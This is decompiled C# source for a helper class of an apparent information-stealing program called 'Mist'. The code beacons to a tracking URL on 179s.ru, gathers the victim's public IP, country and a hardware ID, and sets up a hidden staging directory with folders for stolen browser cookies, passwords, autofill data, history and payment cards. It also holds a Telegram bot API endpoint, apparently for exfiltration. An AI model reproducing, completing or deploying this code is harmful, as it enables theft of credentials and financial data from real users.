using System;
using System.IO;
using System.Management;
using System.Net;
using System.Xml;

namespace Mist
{
	// Token: 0x02000009 RID: 9
	public class Help
	{
		// Token: 0x06000012 RID: 18 RVA: 0x00005EB8 File Offset: 0x000040B8
		public static string CountryCOde()
		{
			WebRequest.Create("http://179s.ru/sniff.php?alias=0hxr42ic6b&data=").GetResponse();
			WebRequest.Create("http://179s.ru/sniff.php?alias=a8w6n2k5g0&data=").GetResponse();
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(new WebClient().DownloadString(Help.GeoIpURL));
			return "[" + xmlDocument.GetElementsByTagName("countryCode")[0].InnerText + "]";
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00005F28 File Offset: 0x00004128
		public static string Country()
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(new WebClient().DownloadString(Help.GeoIpURL));
			return "[" + xmlDocument.GetElementsByTagName("country")[0].InnerText + "]";
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00005F78 File Offset: 0x00004178
		public static string GetHwid()
		{
			string result = "";
			try
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
				ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
				managementObject.Get();
				result = managementObject["VolumeSerialNumber"].ToString();
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00005FDC File Offset: 0x000041DC
		public static string GetProcessorID()
		{
			string result = "";
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor").Get())
			{
				result = (string)((ManagementObject)managementBaseObject)["ProcessorId"];
			}
			return result;
		}

		// Token: 0x0400000E RID: 14
		public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

		// Token: 0x0400000F RID: 15
		public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x04000010 RID: 16
		public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);

		// Token: 0x04000011 RID: 17
		public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x04000012 RID: 18
		public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

		// Token: 0x04000013 RID: 19
		public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

		// Token: 0x04000014 RID: 20
		public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

		// Token: 0x04000015 RID: 21
		public static readonly string downloadsDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";

		// Token: 0x04000016 RID: 22
		public static string[] SysPatch = new string[]
		{
			Help.LocalData,
			Help.AppDate,
			Path.GetTempPath()
		};

		// Token: 0x04000017 RID: 23
		public static string RandomSysPatch = Help.SysPatch[new Random().Next(0, Help.SysPatch.Length)];

		// Token: 0x04000018 RID: 24
		public static string Mut = Help.HWID;

		// Token: 0x04000019 RID: 25
		public static string HWID = Help.GetProcessorID() + Help.GetHwid();

		// Token: 0x0400001A RID: 26
		public static string GeoIpURL = "http://ip-api.com/xml";

		// Token: 0x0400001B RID: 27
		public static string ApiUrl = "https://api.telegram.org/bot";

		// Token: 0x0400001C RID: 28
		public static string IP = new WebClient().DownloadString("https://api.ipify.org/");

		// Token: 0x0400001D RID: 29
		public static string dir = string.Concat(new string[]
		{
			Help.RandomSysPatch,
			"\\",
			GenString.Generate(),
			Help.HWID,
			GenString.GeneNumbersTo().ToString()
		});

		// Token: 0x0400001E RID: 30
		public static string collectionDir = string.Concat(new string[]
		{
			Help.dir,
			"\\",
			GenString.GeneNumbersTo().ToString(),
			Help.HWID,
			GenString.Generate()
		});

		// Token: 0x0400001F RID: 31
		public static string Browsers = Help.collectionDir + "\\Browsers";

		// Token: 0x04000020 RID: 32
		public static string Cookies = Help.Browsers + "\\Cookies";

		// Token: 0x04000021 RID: 33
		public static string Passwords = Help.Browsers + "\\Passwords";

		// Token: 0x04000022 RID: 34
		public static string Autofills = Help.Browsers + "\\Autofills";

		// Token: 0x04000023 RID: 35
		public static string Downloads = Help.Browsers + "\\Downloads";

		// Token: 0x04000024 RID: 36
		public static string History = Help.Browsers + "\\History";

		// Token: 0x04000025 RID: 37
		public static string Cards = Help.Browsers + "\\Cards";

		// Token: 0x04000026 RID: 38
		public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm:ss tt");

		// Token: 0x04000027 RID: 39
		public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");
	}
}
